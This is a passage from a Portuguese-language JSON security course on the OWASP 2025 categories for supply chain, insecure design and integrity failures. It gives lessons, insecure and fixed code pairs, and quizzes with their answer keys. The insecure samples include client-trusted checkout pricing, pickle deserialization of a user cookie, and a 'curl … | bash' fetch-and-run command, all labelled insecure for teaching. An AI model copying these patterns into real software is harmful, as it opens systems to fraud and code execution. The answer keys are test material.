                        "value": "# .npmrc: o escopo @acme aponta para o registro privado\n# (fecha a porta da confusao de dependencias)\n@acme:registry=https://registry.interno.acme/\n\n# instala do lockfile, verificando os hashes de integridade\nnpm ci\n\n# quando possivel, sem executar scripts de pacotes de terceiros\nnpm ci --ignore-scripts\n\n# package-lock.json (trecho): cada pacote carrega um hash verificado\n#   \"node_modules/left-pad\": {\n#     \"version\": \"1.3.0\",\n#     \"resolved\": \"https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz\",\n#     \"integrity\": \"sha512-...=\"    <- recalculado e conferido no npm ci\n#   }\n\n# ao publicar seus proprios pacotes, ative proveniencia (atesta a origem)\nnpm publish --provenance"
                    },
                    {
                        "type": "quote",
                        "value": "Na cadeia de suprimentos, **confie, mas verifique**. Cheque o nome do pacote (typosquatting), use **escopo + registro privado** contra confusão de dependências, desconfie de **scripts de instalação**, e garanta integridade com **hashes do lockfile**, **npm ci** e **proveniência**. Assim você fecha as duas frentes deste módulo: a **configuração** do seu entorno (A02) e a **cadeia** que traz código para dentro (A03)."
                    }
                ],
                "questions": [
                    {
                        "statement": "O que é typosquatting no contexto de pacotes?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Publicar pacote com nome parecido a um popular, esperando erro de digitação.",
                                "isCorrect": true
                            },
                            {
                                "text": "Digitar o comando de instalação do pacote com a sintaxe totalmente errada.",
                                "isCorrect": false
                            },
                            {
                                "text": "Renomear o próprio pacote de tempos em tempos só pra melhorar o SEO.",
                                "isCorrect": false
                            },
                            {
                                "text": "Um erro do próprio gerenciador ao resolver a versão no padrão semver.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Por que scripts de instalação (por exemplo, postinstall) de um pacote são um risco de segurança?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Rodam código sozinhos na instalação, podendo roubar variável e token.",
                                "isCorrect": true
                            },
                            {
                                "text": "Deixam o download do pacote perceptivelmente mais lento do que o normal.",
                                "isCorrect": false
                            },
                            {
                                "text": "Só rodam depois que você chama alguma função da lib no seu código.",
                                "isCorrect": false
                            },
                            {
                                "text": "Não têm acesso a nada além da pasta node_modules, são inofensivos.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Sua empresa usa um pacote interno chamado só 'acme-utils', não publicado publicamente. Um atacante publica 'acme-utils' no registro público com uma versão altíssima e um build passa a baixá-lo. Como se chama isso e como prevenir?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Confusão de dependência: previne com escopo (@acme/utils) e registro privado.",
                                "isCorrect": true
                            },
                            {
                                "text": "Typosquatting: basta conferir com bastante atenção a ortografia do nome do pacote.",
                                "isCorrect": false
                            },
                            {
                                "text": "Força bruta: o suficiente aqui é botar uma senha mais forte no registro.",
                                "isCorrect": false
                            },
                            {
                                "text": "Um caso de XSS: o suficiente é escapar direito toda a saída em HTML.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Durante a instalação, o gerenciador acusa que o hash de integridade de um pacote não bate com o registrado no lockfile. O que isso costuma indicar e por que 'npm ci' ajuda?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Artefato baixado difere do travado; 'npm ci' falha diante da divergência.",
                                "isCorrect": true
                            },
                            {
                                "text": "Só indica que a conexão de internet está lenta nesse momento; ignore e rode de novo.",
                                "isCorrect": false
                            },
                            {
                                "text": "Indica que o pacote está desatualizado, o certo é rodar 'npm update'.",
                                "isCorrect": false
                            },
                            {
                                "text": "Indica erro de sintaxe no seu código, o certo é corrigir o import.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Você vai adicionar uma dependência nova: baixíssimos downloads, nome muito parecido com uma lib famosa e um postinstall no package.json. Qual conjunto de cuidados mitiga melhor o risco antes de adotá-la?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Confirmar o pacote oficial, revisar o postinstall e travar a versão no lockfile.",
                                "isCorrect": true
                            },
                            {
                                "text": "Rodar 'npm install' uma vez e ver se a aplicação sobe sem erro.",
                                "isCorrect": false
                            },
                            {
                                "text": "Adotar assim mesmo, pois todo pacote publicado no registro passa por auditoria oficial.",
                                "isCorrect": false
                            },
                            {
                                "text": "Confiar no pacote porque o nome parecido sugere que é da mesma equipe.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            }
        ]
    },
    {
        "titulo": "Módulo 6 - Design inseguro (A06), integridade (A08) e condições excepcionais (A10)",
        "aulas": [
            {
                "titulo": "Design inseguro: quando o problema está na planta, não no código",
                "blocks": [
                    {
                        "type": "text",
                        "value": "## Design inseguro: quando o problema está na planta, não no código\n\nBem-vindo ao Módulo 6. Até aqui você viu vulnerabilidades que nascem de um erro pontual: uma query que esqueceram de parametrizar, um cabeçalho que faltou, uma senha guardada sem hash. Agora vamos subir um degrau e falar de um problema mais profundo, o **A06:2025 Design inseguro**: quando a falha não está em uma linha de código, e sim na **concepção** do sistema.\n\nA distinção é a chave desta aula. Uma **falha de implementação** é um erro em COMO você escreveu um controle que existe. Uma **falha de design** é a **ausência** de um controle, ou um controle **fraco por concepção**. No segundo caso, não existe código impecável que salve: cada linha perfeita apenas implementa bem a falha.\n\nPense numa agência bancária. A fechadura do cofre pode ser a melhor do mundo, instalada com perfeição (implementação impecável). Mas se a **planta** do prédio colocou uma janela de vidro ao lado do cofre, o problema não é a fechadura, é o projeto. Design inseguro é isso: a segurança que faltou ser **pensada** antes de a obra começar."
                    },
                    {
                        "type": "text",
                        "value": "## Falha de implementação x falha de design\n\nVamos aterrissar com dois exemplos concretos.\n\n- **Falha de implementação:** o sistema usa queries parametrizadas em todos os lugares, mas em UM endpoint alguém concatenou a entrada do usuário direto na SQL. O controle certo existe e é conhecido pelo time; faltou aplicá-lo naquele ponto. A correção é local: parametrizar aquela query.\n- **Falha de design:** o sistema permite recuperar a senha respondendo qual foi o nome do seu primeiro animal de estimação. Mesmo que esse fluxo esteja programado sem nenhum bug, ele é **fraco por concepção**, porque a resposta costuma estar pública nas redes sociais. Nenhum refinamento de código conserta uma pergunta ruim; é preciso **repensar o fluxo**.\n\nRepare no padrão: a falha de implementação se corrige mexendo no código; a falha de design se corrige mexendo na **ideia**. Por isso ela costuma ser mais cara: quando aparece, muitas vezes já está espalhada por telas, endpoints e bancos."
                    },
                    {
                        "type": "code",
                        "value": "// Recuperacao de senha por \"pergunta secreta\" (nome do primeiro pet).\n// O codigo abaixo esta IMPLEMENTADO corretamente: query parametrizada,\n// sem injecao, sem vazamento. O problema nao esta no codigo, e no DESIGN.\nasync function recuperarSenha(email, respostaSecreta) {\n  const [user] = await db.query(\n    \"SELECT id, resposta_pet FROM usuarios WHERE email = $1\",\n    [email]\n  );\n  if (user && user.resposta_pet === respostaSecreta) {\n    return gerarNovaSenhaTemporaria(user.id); // acesso liberado\n  }\n  return null;\n}\n// A \"resposta secreta\" costuma ser publica nas redes sociais.\n// Nenhum codigo perfeito conserta uma PERGUNTA fraca por concepcao."
                    },
                    {
                        "type": "table",
                        "value": "[[\"Aspecto\",\"Falha de implementação\",\"Falha de design\"],[\"Onde mora\",\"No código de um controle que existe\",\"Na ausência ou na concepção do controle\"],[\"Exemplo\",\"Esquecer de parametrizar UMA query\",\"Recuperar senha por pergunta pública (pet)\"],[\"Conserto\",\"Corrigir o trecho de código\",\"Repensar o fluxo ou a regra na planta\"],[\"Como se pega\",\"Revisão de código, testes, SAST\",\"Threat modeling e abuse cases, antes de codar\"]]"
                    },
                    {
                        "type": "text",
                        "value": "## Pensar como o atacante ANTES de codar: threat modeling\n\nSe a falha nasce na planta, é na planta que precisamos caçá-la. **Threat modeling** (modelagem de ameaças) é exatamente isso: sentar antes de escrever código e olhar o desenho da funcionalidade com olhos de atacante. Uma forma simples de conduzir é responder a quatro perguntas:\n\n- **O que estamos construindo?** Desenhe o fluxo, os dados e por onde eles passam.\n- **O que pode dar errado?** Liste ameaças: alguém pode se passar por outro, adulterar um valor, ler o que não devia, repetir uma ação, negar que fez algo.\n- **O que vamos fazer a respeito?** Defina os controles no próprio desenho: limites, validações, verificações de permissão, estados.\n- **Fizemos um bom trabalho?** Revise o modelo conforme o sistema evolui.\n\nUma técnica prática que sai daí são os **abuse cases** (casos de abuso): para cada história de usuário, escreva a versão do vilão. Se a história é \"o usuário aplica um cupom de desconto\", os abuse cases são \"o atacante aplica o mesmo cupom mil vezes\", \"aplica um cupom expirado\", \"combina cupons para zerar o valor\". Cada abuse case vira um requisito de segurança que entra no design.\n\nO objetivo de tudo isso é o **secure by design**: segurança como parte do projeto, não como remendo no fim. Controles previstos desde o desenho, o **menor privilégio** como padrão e as **regras de negócio tratadas como controles de segurança**, tema da próxima aula."
                    },
                    {
                        "type": "quote",
                        "value": "**Recapitulando:** o **A06:2025 Design inseguro** é a falha que mora na **concepção**, não em uma linha de código. Uma **falha de implementação** é um controle existente aplicado errado (conserta-se no código); uma **falha de design** é um controle **ausente ou fraco por concepção** (conserta-se repensando o fluxo). Para achá-la cedo, faça **threat modeling** e escreva **abuse cases** antes de codar, buscando um sistema **secure by design**."
                    }
                ],
                "questions": [
                    {
                        "statement": "O que caracteriza uma falha de DESIGN (design inseguro), em contraste com uma falha de implementação?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Falta um controle adequado, ou ele é fraco por concepção; nada no código resolve isso.",
                                "isCorrect": true
                            },
                            {
                                "text": "Faltam comentários explicativos no código, o que dificulta a manutenção futura do time.",
                                "isCorrect": false
                            },
                            {
                                "text": "Um erro de digitação numa linha, que a próxima revisão de código resolve sem drama nenhum.",
                                "isCorrect": false
                            },
                            {
                                "text": "Uma biblioteca desatualizada, que uma simples atualização de versão já resolve de vez.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Em que momento o threat modeling (\"pensar como o atacante\") gera mais valor?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Antes de codar, ainda no desenho da funcionalidade.",
                                "isCorrect": true
                            },
                            {
                                "text": "Só depois que o sistema já sofreu um ataque real.",
                                "isCorrect": false
                            },
                            {
                                "text": "Apenas quando o sistema estiver para ser aposentado.",
                                "isCorrect": false
                            },
                            {
                                "text": "Nunca; a tarefa é exclusiva da equipe de redes.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um app recupera a senha pedindo \"o nome do seu primeiro animal de estimação\". O código está sem bugs: query parametrizada, sem vazamentos. Que categoria descreve melhor o problema?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Design inseguro: o controle é fraco por concepção, pois a resposta costuma ser pública.",
                                "isCorrect": true
                            },
                            {
                                "text": "Injeção, pois toda query que busca dados pelo email é, por natureza, insegura.",
                                "isCorrect": false
                            },
                            {
                                "text": "Falha criptográfica, pois a senha provavelmente trafega em texto puro na rede.",
                                "isCorrect": false
                            },
                            {
                                "text": "Nenhum problema real, pois um código sem bugs elimina qualquer risco de segurança.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Para a user story \"o usuário aplica um cupom de desconto\", qual das opções é um ABUSE CASE que o threat modeling deveria levantar?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "O atacante aplica o mesmo cupom várias vezes seguidas para zerar o pedido.",
                                "isCorrect": true
                            },
                            {
                                "text": "O usuário digita o código do cupom todo em letras maiúsculas, sem perceber o erro.",
                                "isCorrect": false
                            },
                            {
                                "text": "O usuário fecha a aba do navegador antes de concluir a compra, por distração.",
                                "isCorrect": false
                            },
                            {
                                "text": "O designer escolhe uma cor pouco atraente para o botão de aplicar o cupom no carrinho.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Equipe A: \"em um endpoint esquecemos de aplicar a checagem de permissão que usamos em todos os outros\". Equipe B: \"nossa checagem está em todo lugar, mas o produto foi desenhado para qualquer usuário logado ver os pedidos de todos\". Qual afirmação é correta?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "A é falha de implementação: faltou aplicar um controle existente; B é falha de design, sem controle.",
                                "isCorrect": true
                            },
                            {
                                "text": "Ambas são falhas de implementação, pois se corrigem mexendo apenas no código já pronto e existente.",
                                "isCorrect": false
                            },
                            {
                                "text": "Ambas são falhas de design, pois toda checagem de permissão é, por definição, uma questão de design.",
                                "isCorrect": false
                            },
                            {
                                "text": "A é falha de design e B é falha de implementação, o inverso exato do que parece à primeira vista.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "Regras de negócio são controle de segurança",
                "blocks": [
                    {
                        "type": "text",
                        "value": "## Regras de negócio são controle de segurança\n\nQuando pensamos em segurança, é comum lembrar só de autenticação, criptografia e cabeçalhos. Mas boa parte dos ataques mais lucrativos não quebra nenhuma dessas peças: eles **abusam da lógica de negócio** que o próprio sistema oferece. Se o seu domínio tem limites (valores, quantidades, prazos, quem pode o quê, em que ordem), esses limites são **controles de segurança** e precisam ser tratados como tais.\n\nA pergunta central é: **onde essa regra é realmente garantida?** Se a resposta for \"na tela\" ou \"no app do cliente\", ela não está garantida, porque o cliente está sob controle do usuário (que pode ser o atacante). Toda regra de negócio que protege dinheiro, dados ou acesso precisa ser aplicada **no servidor**."
                    },
                    {
                        "type": "code",
                        "value": "// INSEGURO: o servidor confia no preco e na quantidade que o cliente enviou.\napp.post(\"/checkout\", async (req, res) => {\n  const { produtoId, preco, quantidade } = req.body;\n  const total = preco * quantidade;   // e se \"quantidade\" vier -5?\n  await cobrar(req.user, total);      // total negativo CREDITA o cliente!\n  res.json({ ok: true, total });\n});\n// O atacante edita o request e define o proprio preco (ou uma quantidade\n// negativa) para pagar quase nada, ou ate receber dinheiro da loja."
                    },
                    {
                        "type": "code",
                        "value": "// SEGURO: preco vem do banco (fonte da verdade); quantidade validada.\napp.post(\"/checkout\", async (req, res) => {\n  const { produtoId, quantidade } = req.body;\n  if (!Number.isInteger(quantidade) || quantidade < 1 || quantidade > 100) {\n    return res.status(400).json({ erro: \"quantidade invalida\" });\n  }\n  const produto = await produtos.buscar(produtoId);\n  if (!produto || !produto.ativo) {\n    return res.status(404).json({ erro: \"produto indisponivel\" });\n  }\n  const total = produto.preco * quantidade;  // preco confiavel, do servidor\n  await cobrar(req.user, total);\n  res.json({ ok: true, total });\n});"
                    },
                    {
                        "type": "text",
                        "value": "## Pular etapas e estourar limites\n\nAlém dos valores, o **fluxo** também é uma regra de negócio. Imagine um checkout com três etapas: montar o carrinho, pagar e confirmar. Um atacante que chama direto o endpoint de **confirmar**, sem passar pelo pagamento, pode receber o produto de graça se o servidor não checar em que **estado** o pedido está. A defesa é uma **máquina de estados** validada no backend: só confirma quem realmente pagou.\n\nO mesmo raciocínio vale para vários limites do dia a dia, que só valem de verdade se forem checados no servidor:\n\n- **Limite de transferência:** o valor máximo tem que ser validado no backend, não apenas escondido no formulário.\n- **Uso único de cupom:** marcar o uso de forma **atômica** no banco, para que duas requisições simultâneas não apliquem o mesmo cupom duas vezes.\n- **Tentativas por minuto:** rate limiting é uma decisão de **design** contra força bruta e abuso, não um detalhe opcional.\n\nSempre que existir um \"no máximo\", um \"somente depois de\" ou um \"apenas o dono pode\", você está diante de uma regra de negócio que também é um controle de segurança."
                    },
                    {
                        "type": "table",
                        "value": "[[\"Regra de negócio\",\"O que o atacante tenta\",\"Controle de design\"],[\"Preço do produto\",\"Enviar o próprio preço no request\",\"Buscar o preço no servidor (fonte da verdade)\"],[\"Quantidade do item\",\"Quantidade negativa ou gigante\",\"Validar inteiro dentro de limites\"],[\"1 cupom por cliente\",\"Aplicar o cupom várias vezes\",\"Marcar o uso no servidor, de forma atômica\"],[\"Fluxo pagar → confirmar\",\"Pular direto para confirmar\",\"Máquina de estados validada no servidor\"],[\"Limite de transferência\",\"Transferir acima do permitido\",\"Checar o limite no backend, não só na tela\"]]"
                    },
                    {
                        "type": "quote",
                        "value": "**Recapitulando:** as **regras de negócio** (preços, quantidades, limites, ordem das etapas, uso único) são **controles de segurança** e precisam ser garantidas **no servidor**, nunca só na tela. Confiar no preço enviado pelo cliente, aceitar quantidade negativa ou deixar pular etapas de um fluxo são **falhas de design**. Busque a **fonte da verdade** no backend, valide limites e use **máquinas de estado** e operações **atômicas**."
                    }
                ],
                "questions": [
                    {
                        "statement": "Por que o servidor não deve confiar no preço do produto enviado pelo navegador do cliente?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Porque o cliente pode alterar o valor; o preço confiável deve vir do banco, no servidor.",
                                "isCorrect": true
                            },
                            {
                                "text": "Porque enviar o preço no request deixa a página perceptivelmente mais lenta ao carregar.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque navegadores modernos não conseguem enviar valores numéricos ao servidor.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque o protocolo HTTPS proíbe, por padrão, que preços trafeguem na requisição.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Aceitar quantidade negativa em um carrinho, gerando um total negativo, é um exemplo de:",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Falha de lógica de negócio: a quantidade não foi tratada como um controle de segurança.",
                                "isCorrect": true
                            },
                            {
                                "text": "Falha criptográfica, pois o carrinho deveria trafegar cifrado entre cliente e servidor.",
                                "isCorrect": false
                            },
                            {
                                "text": "Erro de digitação do usuário, sem qualquer impacto real de segurança no sistema todo.",
                                "isCorrect": false
                            },
                            {
                                "text": "Configuração incorreta do servidor web, que basta ajustar num arquivo de configuração.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um handler faz: const { preco, quantidade } = req.body; const total = preco * quantidade; e cobra o total. Qual correção resolve o problema pela raiz?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Buscar o preço no banco pelo produtoId e validar a quantidade dentro de limites aceitáveis.",
                                "isCorrect": true
                            },
                            {
                                "text": "Trocar let por const na declaração das variáveis, deixando o código bem mais robusto.",
                                "isCorrect": false
                            },
                            {
                                "text": "Converter o total para string antes de salvar no banco, evitando erros de tipo futuros.",
                                "isCorrect": false
                            },
                            {
                                "text": "Envolver o cálculo inteiro em um bloco try/catch, para capturar qualquer erro numérico.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um checkout tem etapas carrinho → pagamento → confirmação. O atacante chama direto o endpoint /confirmar sem pagar e recebe o produto. Qual é a defesa correta?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Validar o estado do pedido no servidor: só confirmar se o pagamento foi mesmo concluído.",
                                "isCorrect": true
                            },
                            {
                                "text": "Esconder o botão de confirmar usando CSS, para não aparecer antes da hora certa.",
                                "isCorrect": false
                            },
                            {
                                "text": "Confiar num campo \"pago: true\" enviado pelo próprio cliente na requisição.",
                                "isCorrect": false
                            },
                            {
                                "text": "Renomear o endpoint para um nome difícil de adivinhar, dificultando o acesso direto.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "A regra \"cada cliente usa o cupom no máximo uma vez\" funciona assim: lê os usos no banco, se for 0 aplica e depois grava o uso. Sob muitas requisições simultâneas, o cupom é aplicado várias vezes. Qual a melhor correção?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Tornar a checagem e a gravação atômicas (transação ou constraint única), eliminando a corrida.",
                                "isCorrect": true
                            },
                            {
                                "text": "Checar o limite apenas no front-end, o que deixa a validação bem mais rápida para o usuário.",
                                "isCorrect": false
                            },
                            {
                                "text": "Aumentar o timeout do servidor, para que as requisições não cheguem a colidir entre si.",
                                "isCorrect": false
                            },
                            {
                                "text": "Confiar que duas requisições jamais chegam exatamente no mesmo instante no servidor.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "Integridade: os perigos da desserialização insegura",
                "blocks": [
                    {
                        "type": "text",
                        "value": "## Integridade: quando você confia em dados que não devia\n\nAs próximas duas aulas cobrem o **A08:2025 Falhas de integridade de software ou dados**. Integridade, aqui, quer dizer uma coisa simples: você está **confiando em algo que pode ter sido adulterado** no caminho, seja um dado, um pedaço de código, uma atualização ou uma dependência.\n\nA categoria reúne três frentes que vamos percorrer: a **desserialização insegura** (tema desta aula), as **atualizações e plugins sem verificação de assinatura** e a **integridade do pipeline CI/CD** (próxima aula). O fio que costura tudo é o mesmo: **confiar sem verificar**."
                    },
                    {
                        "type": "text",
                        "value": "## Serializar e desserializar, e por que isso pode explodir\n\n**Serializar** é transformar um objeto que está na memória numa sequência de bytes ou texto, para guardar ou transmitir (um JSON, ou um formato nativo da linguagem). **Desserializar** é o caminho inverso: reconstruir o objeto a partir desses bytes.\n\nO perigo mora nos **formatos nativos** de algumas linguagens (o pickle do Python, a serialização do Java, o unserialize do PHP, algumas libs do Node). Diferente do JSON, que só produz **dados** (texto, número, lista, objeto simples), esses formatos podem **instanciar objetos arbitrários** e até **executar código** durante a reconstrução. Se o atacante controla o blob serializado, ele transforma a desserialização em execução de comandos no servidor.\n\nA regra de ouro: **nunca desserialize dados de origem não confiável** usando um formato nativo que reconstrói objetos."
                    },
                    {
                        "type": "code",
                        "value": "# INSEGURO: desserializa, com pickle, dados que vieram do usuario.\nimport pickle, base64\n\ndef carregar_preferencias(cookie_valor):\n    dados = base64.b64decode(cookie_valor)\n    return pickle.loads(dados)  # pickle pode INSTANCIAR objetos e RODAR codigo\n\n# Um cookie forjado pode executar comandos no servidor (RCE).\n# Nao importa que o resto do codigo esteja perfeito: o formato e o problema."
                    },
                    {
                        "type": "code",
                        "value": "# SEGURO: use um formato de dados puro (JSON) e valide o schema.\nimport json\n\ndef carregar_preferencias(cookie_valor):\n    dados = json.loads(cookie_valor)         # JSON so gera dados, nunca codigo\n    if not isinstance(dados, dict):\n        raise ValueError(\"formato invalido\")\n    tema = dados.get(\"tema\")\n    if tema not in (\"claro\", \"escuro\"):      # valida cada campo esperado\n        raise ValueError(\"tema invalido\")\n    return {\"tema\": tema}\n\n# Se o cookie PRECISA carregar um objeto rico, assine com HMAC e\n# verifique a assinatura ANTES de qualquer parsing."
                    },
                    {
                        "type": "text",
                        "value": "## Sinais de perigo e defesas\n\nLevante a guarda sempre que um dado vindo de fora (cookie, campo escondido, corpo de requisição, mensagem de fila) for reconstruído em objeto. As defesas se somam:\n\n- **Prefira formatos de dados puros** como JSON, que geram apenas dados, e **valide o schema** de cada campo.\n- **Verifique a integridade antes de desserializar:** se o dado precisa mesmo ir e voltar pelo cliente, assine com **HMAC** e cheque a assinatura **antes** de qualquer parsing rico.\n- **Menor privilégio:** o processo que desserializa não deveria ter permissão para rodar comandos do sistema.\n\nUm caso clássico dessa categoria são os **JWT**. Aceitar um token com o cabeçalho alg definido como \"none\", ou simplesmente não verificar a assinatura, é confiar em dados sem checar a integridade: o atacante edita as claims (por exemplo, o papel de admin) e o servidor obedece. Verificar a assinatura com o segredo ou a chave correta é justamente o que garante a integridade do token."
                    },
                    {
                        "type": "quote",
                        "value": "**Recapitulando:** a **desserialização insegura** acontece quando você reconstrói, a partir de dados não confiáveis, um objeto usando formatos nativos (pickle, Java, PHP, algumas libs do Node) que podem **instanciar objetos e executar código**, levando a **RCE**. Defenda-se preferindo **JSON** (dados puros), **validando o schema** e, quando precisar de um objeto rico, **assinando com HMAC e verificando ANTES de desserializar**. Não verificar a assinatura de um **JWT** é a mesma falha de integridade."
                    }
                ],
                "questions": [
                    {
                        "statement": "O que é desserialização?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Reconstruir um objeto a partir de bytes ou texto salvos, o inverso de serializar.",
                                "isCorrect": true
                            },
                            {
                                "text": "Apagar de forma permanente os dados de um objeto que estava guardado na memória.",
                                "isCorrect": false
                            },
                            {
                                "text": "Criptografar o conteúdo de um arquivo inteiro antes de transmiti-lo pela rede.",
                                "isCorrect": false
                            },
                            {
                                "text": "Comprimir uma imagem para que ela passe a ocupar bem menos espaço em disco.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Para receber dados de uma fonte não confiável, o que é mais seguro?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Usar um formato de dados puro, como JSON, e validar o schema de cada campo recebido.",
                                "isCorrect": true
                            },
                            {
                                "text": "Usar formatos nativos que reconstroem objetos, como pickle, para ganhar velocidade.",
                                "isCorrect": false
                            },
                            {
                                "text": "Confiar no dado recebido sempre que ele estiver codificado em base64.",
                                "isCorrect": false
                            },
                            {
                                "text": "Desativar a validação de schema, para que erros não apareçam para o usuário final.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "O código faz: return pickle.loads(base64.b64decode(cookie)) sobre um cookie controlado pelo usuário. Qual é o risco principal?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Desserialização insegura: um cookie forjado pode instanciar objetos e rodar código.",
                                "isCorrect": true
                            },
                            {
                                "text": "Só um erro de codificação em base64, sem nenhum impacto real de segurança no sistema todo.",
                                "isCorrect": false
                            },
                            {
                                "text": "Vazamento de estilos CSS para o cliente, através do próprio valor armazenado no cookie.",
                                "isCorrect": false
                            },
                            {
                                "text": "Nenhum risco real: o próprio pickle já valida sozinho a origem dos dados recebidos.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um serviço aceita um JWT com o cabeçalho {\"alg\":\"none\"} e não verifica a assinatura, confiando nas claims. Que tipo de falha é essa?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Falha de integridade: sem verificar a assinatura, o atacante consegue forjar as claims.",
                                "isCorrect": true
                            },
                            {
                                "text": "Falha de configuração de CSS presente na própria página de login do sistema.",
                                "isCorrect": false
                            },
                            {
                                "text": "Injeção de SQL, aplicada diretamente dentro do cabeçalho do token JWT.",
                                "isCorrect": false
                            },
                            {
                                "text": "Apenas uma falha de disponibilidade, sem relação alguma com a autenticidade do token.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "O requisito obriga a receber, num cookie, um objeto rico (não apenas dados simples) vindo do cliente. Qual combinação melhor mitiga a desserialização insegura?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Assinar o payload com HMAC, verificar antes de desserializar e validar o schema resultante.",
                                "isCorrect": true
                            },
                            {
                                "text": "Desserializar o dado primeiro e, caso dê erro, simplesmente tentar de novo em seguida.",
                                "isCorrect": false
                            },
                            {
                                "text": "Usar pickle normalmente, mas envolvendo a chamada num bloco try/except no código.",
                                "isCorrect": false
                            },
                            {
                                "text": "Comprimir o objeto inteiro com gzip antes de enviá-lo de volta para o servidor.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "Integridade: assinaturas, atualizações e o pipeline CI/CD",
                "blocks": [
                    {
                        "type": "text",
                        "value": "## Confiar sem verificar: atualizações, plugins e dependências\n\nA segunda frente da integridade (A08) é o **código** que entra no seu sistema sem passar por conferência. Programas que se **atualizam sozinhos**, que carregam **plugins** de terceiros ou que puxam **scripts** de uma CDN precisam responder a uma pergunta antes de executar qualquer coisa: **isto veio mesmo de quem eu penso, e chegou intacto?**\n\nQuando a resposta é \"não sei\", abre-se uma porta perigosa. Se um atacante consegue interferir no canal de atualização (a CDN, o servidor de updates, a rede), ele empurra código malicioso para **todos** os usuários de uma vez, com a aparência de uma atualização legítima. Ataques desse tipo, em que a confiança na origem é abusada, estão entre os mais impactantes justamente por essa escala."
                    },
                    {
                        "type": "text",
                        "value": "## Assinatura digital, em uma frase\n\nA defesa central aqui é a **assinatura digital**. Em uma frase: quem produz o artefato o **assina com uma chave privada**, e quem recebe **verifica com a chave pública** correspondente. Se a verificação passa, você ganha duas garantias ao mesmo tempo: **origem** (veio de quem tem a chave privada) e **integridade** (não foi alterado depois de assinado).\n\nO detalhe que muda tudo é **quando** você verifica: a assinatura tem que ser conferida **antes** de instalar, executar ou carregar o conteúdo. Verificar depois de rodar não protege de nada."
                    },
                    {
                        "type": "code",
                        "value": "# INSEGURO: baixa e executa um script sem verificar de onde veio.\ncurl -s https://updates.exemplo.com/install.sh | bash\n\n// INSEGURO (app que se atualiza): baixa e executa sem checar assinatura.\nconst bin = await baixar(\"https://cdn.exemplo.com/app-update.bin\");\nawait executar(bin);   // e se a CDN ou a rede foram comprometidas?"
                    },
                    {
                        "type": "code",
                        "value": "// SEGURO (app): verifica a assinatura com a chave publica ANTES de executar.\nconst bin = await baixar(\"https://cdn.exemplo.com/app-update.bin\");\nconst assinatura = await baixar(\"https://cdn.exemplo.com/app-update.sig\");\nif (!verificarAssinatura(bin, assinatura, CHAVE_PUBLICA_DO_FORNECEDOR)) {\n  throw new Error(\"atualizacao nao confiavel: assinatura invalida\");\n}\nawait executar(bin);\n\n<!-- SEGURO (browser): Subresource Integrity trava o conteudo do script. -->\n<!-- Se a CDN entregar um arquivo alterado, o hash nao bate e o browser bloqueia. -->\n<script src=\"https://cdn.exemplo.com/lib.js\"\n        integrity=\"sha384-oqVuAfXRKap7fdgcCY5uykM6R9GqQ8Kux9rx7HNQlGYl1kPzQho1wx4JwY8w\"\n        crossorigin=\"anonymous\"></script>"
                    },
                    {
                        "type": "text",
                        "value": "## Integridade no pipeline CI/CD\n\nExiste um lugar onde a integridade é especialmente valiosa para o atacante: o **pipeline de CI/CD**, a esteira que compila, testa e publica o seu software. Se alguém injeta um passo malicioso na esteira, ou compromete uma dependência usada no build, o **artefato final sai assinado e confiável** e carrega o backdoor para todos os clientes. A assinatura estava certa; o que foi contaminado veio **antes** dela.\n\nPor isso, trate a esteira como código de produção:\n\n- **Menor privilégio** para os jobs e os segredos; separe quem faz o build de quem faz o deploy.\n- **Fixe e verifique dependências**: use versões travadas por hash em vez de tags móveis como latest, tanto para pacotes quanto para actions e imagens de container.\n- **Revise mudanças no próprio pipeline** (o arquivo de CI é um alvo) e prefira **commits assinados**.\n- **Gere procedência do build**: registrar de forma verificável como e de onde o artefato foi produzido."
                    },
                    {
                        "type": "quote",
